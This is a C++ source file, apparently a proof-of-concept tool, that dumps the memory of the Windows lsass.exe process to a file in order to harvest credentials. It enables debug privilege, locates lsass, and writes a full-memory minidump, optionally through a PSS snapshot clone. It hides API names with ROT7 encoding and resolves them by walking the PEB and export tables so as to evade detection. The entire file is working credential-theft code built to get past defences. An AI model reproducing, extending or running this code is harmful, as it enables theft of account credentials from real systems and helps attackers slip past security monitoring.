#include "stdafx.h"
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <tchar.h>
#include <winnt.h>
#include <winternl.h>
#include <Lmcons.h>
#include <processsnapshot.h>

using namespace std;

#define ADDR unsigned __int64

DWORD ignored;


char enc_func[4][20] = {
	"NlaWyvjHkkylzz", // GetProcAddress ROT7
	"NlaTvkbslOhukslH", // GetModuleHandleA
	"Wyvjlzz32MpyzaD", // Process32FirstW
	"Wyvjlzz32UleaD" // Process32NextW
};

void dec_r7(char* val) {
	size_t i;
	int base;
	for (i = 0; i < strlen(val); i++) {
		if (val[i] <= 57) {
			continue;	// numbers not processed
		}
		else if (val[i] <= 90) {
			base = 65;
		}
		else {
			base = 97;
		}
		if (((int)val[i] - base - 7) < 0) {
			val[i] = (val[i] + 19);
		}
		else {
			val[i] = val[i] - 7;
		}
	}
	//printf("decoded value: %s", val);
}

// Utility function to convert an UNICODE_STRING to a char*
HRESULT UnicodeToAnsi(LPCOLESTR pszW, LPSTR* ppszA) {
	ULONG cbAnsi, cCharacters;
	DWORD dwError;
	// If input is null then just return the same.    
	if (pszW == NULL)
	{
		*ppszA = NULL;
		return NOERROR;
	}
	cCharacters = wcslen(pszW) + 1;
	cbAnsi = cCharacters * 2;

	*ppszA = (LPSTR)CoTaskMemAlloc(cbAnsi);
	if (NULL == *ppszA)
		return E_OUTOFMEMORY;

	if (0 == WideCharToMultiByte(CP_ACP, 0, pszW, cCharacters, *ppszA, cbAnsi, NULL, NULL))
	{
		dwError = GetLastError();
		CoTaskMemFree(*ppszA);
		*ppszA = NULL;
		return HRESULT_FROM_WIN32(dwError);
	}
	return NOERROR;
}

namespace dynamic {
	using GetModuleHandlePrototype = HMODULE(WINAPI*)(LPCSTR);
	GetModuleHandlePrototype GMH;

	using GetProcAddressPrototype = FARPROC(WINAPI*)(HMODULE, LPCSTR);
	GetProcAddressPrototype GPA;

	using Process32FirstPrototype = BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32);
	Process32FirstPrototype P32F;

	using Process32NextPrototype = Process32FirstPrototype;
	Process32NextPrototype P32N;

	ADDR find_dll_export(ADDR dll_base, const char* export_name) {
		// Read the DLL PE header and NT header
		PIMAGE_DOS_HEADER peHeader = (PIMAGE_DOS_HEADER)dll_base;
		PIMAGE_NT_HEADERS peNtHeaders = (PIMAGE_NT_HEADERS)(dll_base + peHeader->e_lfanew);

		// The RVA of the export table if indicated in the PE optional header
		// Read it, and read the export table by adding the RVA to the DLL base address in memory
		DWORD exportDescriptorOffset = peNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(dll_base + exportDescriptorOffset);

		// Browse every export of the DLL. For the i-th export:
		// - The i-th element of the name table contains the export name
		// - The i-th element of the ordinal table contains the index with which the functions table must be indexed to get the final function address
		DWORD* name_table = (DWORD*)(dll_base + exportTable->AddressOfNames);
		WORD* ordinal_table = (WORD*)(dll_base + exportTable->AddressOfNameOrdinals);
		DWORD* func_table = (DWORD*)(dll_base + exportTable->AddressOfFunctions);

		for (int i = 0; i < exportTable->NumberOfNames; ++i) {
			char* funcName = (char*)(dll_base + name_table[i]);
			ADDR func_ptr = dll_base + func_table[ordinal_table[i]];
			if (!_strcmpi(funcName, export_name)) {
				return func_ptr;
			}
		}

		return NULL;
	}

	ADDR find_dll_base(const char* dll_name) {
		// https://stackoverflow.com/questions/37288289/how-to-get-the-process-environment-block-peb-address-using-assembler-x64-os - x64 version
		// Note: the PEB can also be found using NtQueryInformationProcess, but this technique requires a call to GetProcAddress
		//  and GetModuleHandle which defeats the very purpose of this PoC
		PTEB teb = reinterpret_cast<PTEB>(__readgsqword(reinterpret_cast<DWORD_PTR>(&static_cast<NT_TIB*>(nullptr)->Self)));
		PPEB_LDR_DATA loader = teb->ProcessEnvironmentBlock->Ldr;

		PLIST_ENTRY head = &loader->InMemoryOrderModuleList;
		PLIST_ENTRY curr = head->Flink;

		// Iterate through every loaded DLL in the current process
		do {
			PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
			char* dllName;
			// Convert unicode buffer into char buffer for the time of the comparison, then free it
			UnicodeToAnsi(dllEntry->FullDllName.Buffer, &dllName);
			char* result = strstr(dllName, dll_name);
			CoTaskMemFree(dllName); // Free buffer allocated by UnicodeToAnsi

			if (result != NULL) {
				// Found the DLL entry in the PEB, return its base address
				return (ADDR)dllEntry->DllBase;
			}
			curr = curr->Flink;
		} while (curr != head);

		return NULL;
	}

	void resolve_imports(void) {
		/* 'decrypt' function names*/
		int rows = sizeof enc_func / sizeof enc_func[0];
		for (int i = 0; i < rows; i++) {
			dec_r7(enc_func[i]);
			//printf("decode string: %s\n", enc_func[i]);
		}

		ADDR kernel32_base = find_dll_base("KERNEL32.DLL");
		dynamic::GPA = (GetProcAddressPrototype)find_dll_export(kernel32_base, enc_func[0]);
		dynamic::GMH = (GetModuleHandlePrototype)find_dll_export(kernel32_base, enc_func[1]);

#define _import(_name, _type) ((_type) dynamic::GPA(dynamic::GMH("kernel32.dll"), _name))

		dynamic::P32F = _import(enc_func[2], Process32FirstPrototype);
		dynamic::P32N = _import(enc_func[3], Process32NextPrototype);
	}
}

/* Grant current process DEBUG_PRIVILEGE*/
BOOL EnableTokenPrivilege(LPCTSTR lpszPrivilege) {
	TOKEN_PRIVILEGES tp;
	BOOL bResult = FALSE;
	HANDLE hToken = NULL;
	DWORD dwSize;

	ZeroMemory(&tp, sizeof(tp));
	tp.PrivilegeCount = 1;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken) &&
		LookupPrivilegeValue(NULL, lpszPrivilege, &tp.Privileges[0].Luid)) {
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		bResult = AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, &dwSize);
	}
	CloseHandle(hToken);

	return bResult;
}

/* PssCaptureSnapshot */
BOOL CALLBACK MyMiniDumpWriteDumpCallback(
	__in     PVOID CallbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
{
	switch (CallbackInput->CallbackType)
	{
	case 16: // IsProcessSnapshotCallback
		CallbackOutput->Status = S_FALSE;
		break;
	}
	return TRUE;
}

/* dump of credentials from lsass */
int main(int argc, char *argv[]) {
	DWORD lsassPID = 0;
	HANDLE lsassHandle = NULL;
	HANDLE outFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	LPCWSTR processName = L"";

	dynamic::resolve_imports();

	if (!EnableTokenPrivilege(SE_DEBUG_NAME)) {
		return -1;
	}

	if (dynamic::P32F(snapshot, &processEntry)) {
		while (_wcsicmp(processName, L"lsass.exe") != 0) {
			dynamic::P32N(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			lsassPID = processEntry.th32ProcessID;
		}
		wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;
	}

	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);

	/* Pss or miniwritedump option*/
	BOOL isDumped;

	if (argc > 1 && std::string(argv[1]) == "PSS") { // build switch
		cout << "[+] Using PSS cloning process approach." << endl;
		HANDLE snapshotHandle = NULL;
		DWORD flags = (DWORD)PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;
		MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
		ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
		CallbackInfo.CallbackRoutine = &MyMiniDumpWriteDumpCallback;
		CallbackInfo.CallbackParam = NULL;

		PssCaptureSnapshot(lsassHandle, (PSS_CAPTURE_FLAGS)flags, CONTEXT_ALL, (HPSS*)&snapshotHandle);
		isDumped = MiniDumpWriteDump(snapshotHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);

		PssFreeSnapshot(GetCurrentProcess(), (HPSS)snapshotHandle);
	}
	else {
		cout << "[+] Using default lsass dump approach, for PSS clone pass 'PSS' as cli argument" << endl;
		isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
	}

	

	if (isDumped) {
		cout << "[+] lsass dumped successfully!" << endl;
	}
	else {
		cout << "[e]Nothing has been dumped." << endl;
	}

	return 0;
}
